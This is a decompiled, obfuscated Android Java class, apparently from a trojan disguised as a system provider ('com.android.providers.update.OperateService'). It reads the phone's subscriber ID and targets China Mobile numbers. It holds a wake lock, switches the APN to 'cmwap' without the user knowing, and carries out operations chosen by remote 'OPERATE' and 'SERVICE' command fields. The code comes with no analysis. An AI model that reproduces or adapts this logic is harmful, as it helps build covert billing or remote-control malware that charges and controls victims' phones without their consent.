package defpackage;

import android.content.Context;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.telephony.TelephonyManager;
import com.android.providers.handler.ApnHandler;
import com.android.providers.update.OperateService;

/* renamed from: ae reason: default package */
public class ae extends Thread {
    final /* synthetic */ OperateService a;

    public ae(OperateService operateService) {
        this.a = operateService;
    }

    public void run() {
        boolean z;
        String str = "2";
        String str2 = "1";
        String str3 = "";
        try {
            int b = a.a((Context) this.a).b(a.c);
            if ((b + 1) % 10 != 0) {
                a.a((Context) this.a).a(a.c, b + 1);
                return;
            }
            WakeLock newWakeLock = ((PowerManager) this.a.getSystemService("power")).newWakeLock(536870922, "MyActivity");
            newWakeLock.acquire();
            Thread.sleep(20000);
            String subscriberId = ((TelephonyManager) this.a.getSystemService("phone")).getSubscriberId();
            if (subscriberId == null) {
                String str4 = "";
                subscriberId = str3;
            }
            if (subscriberId.startsWith("46000") || subscriberId.startsWith("46002")) {
                ApnHandler apnHandler = new ApnHandler(this.a);
                String b2 = apnHandler.b();
                if (b2.equalsIgnoreCase("cmwap")) {
                    d.b = true;
                } else {
                    d.b = false;
                }
                String a2 = this.a.a();
                if (a2 == null || a2.equals("")) {
                    this.a.stopSelf(this.a.h);
                    if (newWakeLock != null) {
                        newWakeLock.release();
                        return;
                    }
                    return;
                }
                StringBuffer stringBuffer = new StringBuffer();
                stringBuffer.append(a2);
                if (stringBuffer != null && stringBuffer.length() > 0) {
                    String a3 = p.a(stringBuffer.toString(), "OPERATE");
                    if (a3 == null) {
                        String str5 = "";
                        a3 = str3;
                    }
                    String a4 = p.a(stringBuffer.toString(), "SERVICE");
                    if (a4 == null) {
                        String str6 = "";
                        a4 = str3;
                    }
                    if (a4.equals("2")) {
                        this.a.a(stringBuffer.toString());
                        if (newWakeLock != null) {
                            newWakeLock.release();
                        }
                    } else if (!a3.equals("0")) {
                        if (!a3.equals("1") && !a3.equals("2") && !b2.equalsIgnoreCase("cmwap")) {
                            apnHandler.a();
                            while (ak.p) {
                                Thread.sleep(2000);
                            }
                            d.b = true;
                            Thread.sleep(10000);
                        }
                        if (a3 == null || a3.equals("")) {
                            z = false;
                        } else {
                            this.a.i = p.a(this.a, stringBuffer.toString(), ak.o + a3);
                            if (a3.equals("1")) {
                                this.a.a(this.a.i);
                                z = true;
                            } else if (a3.equals("2")) {
                                this.a.b(this.a.i);
                                z = true;
                            } else if (a3.equals("6")) {
                                this.a.c(this.a.i);
                                z = true;
                            } else {
                                this.a.d(this.a.i);
                                z = false;
                            }
                        }
                        String str7 = k.e;
                        if (str7 == null) {
                            String str8 = "";
                            str7 = str3;
                        }
                        if (z || str7.equals("1")) {
                            this.a.b();
                            a.a((Context) this.a).a(a.c, b + 1);
                        }
                        if (newWakeLock != null) {
                            newWakeLock.release();
                        }
                        if (b2 != null && b2.equalsIgnoreCase("cmnet")) {
                            apnHandler.c();
                            d.b = false;
                        } else if (b2.equalsIgnoreCase("cmwap")) {
                            apnHandler.a();
                            d.b = true;
                        }
                    } else if (newWakeLock != null) {
                        newWakeLock.release();
                    }
                }
            } else {
                this.a.stopSelf(this.a.h);
                if (newWakeLock != null) {
                    newWakeLock.release();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
